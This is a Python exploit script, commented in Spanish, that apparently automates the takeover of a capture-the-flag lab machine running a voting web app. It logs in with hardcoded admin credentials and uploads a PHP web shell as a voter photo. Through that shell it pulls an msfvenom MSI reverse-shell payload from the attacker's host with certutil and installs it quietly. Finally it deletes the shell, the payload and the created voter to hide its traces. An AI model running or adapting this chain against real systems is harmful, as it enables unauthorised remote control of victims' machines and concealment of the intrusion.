#!/usr/bin/python3

import threading, signal, re, os
import requests, argparse, time
from pwn import *

# Variables globales
url = "http://10.10.10.239"
username = "lanz"
session = requests.Session()

# Funciones del programa
# |_ CTRL+C
def def_handler(sig, frame):
    print("\nSal1end0...\n")
    exit(1)

signal.signal(signal.SIGINT, def_handler)

# |_ Definicion de parametros
def arguments():
    parse = argparse.ArgumentParser()
    parse.add_argument(dest='lhost', type=str, help='IP para generar la reverse shell')
    parse.add_argument(dest='lport', type=int, help='Puerto para generar reverse shell')
    parse.add_argument('-msi', dest='msi_file_name', type=str, default='ajatepille.msi', help='Nombre del paquete MSI malicioso')
    parse.add_argument('-c', dest='command', type=str, default='whoami', help='Comando a ejecutar en el sistema')
    return parse.parse_args()

# |_ Ejecución de comandos
def rce_arbitrary_file_up(command):
    try:
        data_get = {
            "xmd" : command
        }
        r = session.get(url + '/images/quesedice.php', params=data_get, timeout=10)
        if r.text != "":
            print("\n" + r.text)
        else:
            pass
    except requests.exceptions.Timeout as e:
        pass

def main():
    p1 = log.progress("Creamos votante en la web")

    # Login
    data_post = {
        "username" : "admin",
        "password" : "@LoveIsInTheAir!!!!",
        "login" : ""
    }
    r = session.post(url + '/admin/login.php', data=data_post)
    if "Neovic Devierte" not in r.text:
        print("[!] Error al logearnos como admin")
        exit(1)

    # Creamos Votante
    data_file = [
        ('photo',
            ('quesedice.php', "<?php $command=shell_exec($_GET['xmd']); echo $command; ?>", 'application/x-php'))]
    data_post = {
        "firstname" : username,
        "lastname" : username,
        "password" : username,
        "add" : ""
    }
    r = session.post(url + '/admin/voters_add.php', data=data_post, files=data_file)
    if "Voter added successfully" not in r.text:
        print("[!] Error al crear el votante")
        exit(1)

    p1.success("✔")
    time.sleep(1)

    # Extraemos el nombre del archivo en caso de pasar una ruta absoluta al parametro -msi
    msi_file_name = "ajatepille.msi"
    path_msi = os.path.basename(msi_file_name)

    if os.path.exists(msi_file_name) == False:
        p2 = log.progress("Generando paquete %s malicioso" % (path_msi))
        p2.status("Espera un momento...")
        os.system("msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%d -f msi -o %s > /dev/null 2>&1" % (args.lhost, args.lport, msi_file_name))
        p2.success("✔")

    # Levantamos un servidor web por 30 segundos en la ruta donde este el script: <timeout 10 python3 -m http.server>
    # |_ https://stackoverflow.com/questions/1196074/how-to-start-a-background-process-in-python#answer-7224186
    ls_output=subprocess.Popen(["timeout", "30", "python3", "-m", "http.server"])

    p3 = log.progress("Ejecución de comandos")

    p3.status("Subiendo %s a la máquina" % (path_msi))
    time.sleep(2)
    rce_arbitrary_file_up("certutil.exe -f -urlcache -split http://%s:8000/%s c:\\Users\\Phoebe\\Videos\\%s >null" % (args.lhost, path_msi, path_msi))

    p3.status("Instalando %s - Reverse Shell" % (path_msi))
    time.sleep(4)
    rce_arbitrary_file_up("msiexec /quiet /qn /i c:\\Users\\Phoebe\\Videos\\%s >null" % (path_msi))

    time.sleep(2)
    rce_arbitrary_file_up("del c:\\xampp\\htdocs\\omrs\\images\\quesedice.php del c:\\Users\\Phoebe\\Videos\\%s" % (path_msi))

    p3.success("✔")

    # Borramos votante
    r = session.get(url + '/admin/voters.php')
    # |_ En caso de muchos usuarios, extraemos la info del usuario lanz
    position_user = r.text.find(username)
    # |_ Tomamos la posición y extraemos el texto que este desde ella hasta 300 caracteres más
    rtext_user_id = r.text[position_user:position_user+300]
    # |_ Extraemos el id
    id_user = re.findall(r"<a href='#edit_photo' data-toggle='modal' class='pull-right photo' data-id='(.*?)'", rtext_user_id)[0]

    data_post = {
        "id" : id_user,
        "delete" : ""
    }
    r = session.post(url + '/admin/voters_delete.php', data=data_post)

# Inicio del programa
if __name__ == '__main__':
    print("\n[+] Quizás de primeras no te funcione ya que la máquina esta muy lenta y hace lo que quiere :P, intenta algunas veces :(\n")
    args = arguments()

    try:
        threading.Thread(target=main).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(args.lport, timeout=30).wait_for_connection()

    if shell.sock is None:
        log.failure("La conexión no se ha obtenido, ¿haz cambiado el puerto? (el paquete debe tener el mismo puerto (crea uno nuevo))")
        exit(1)

    shell.interactive()
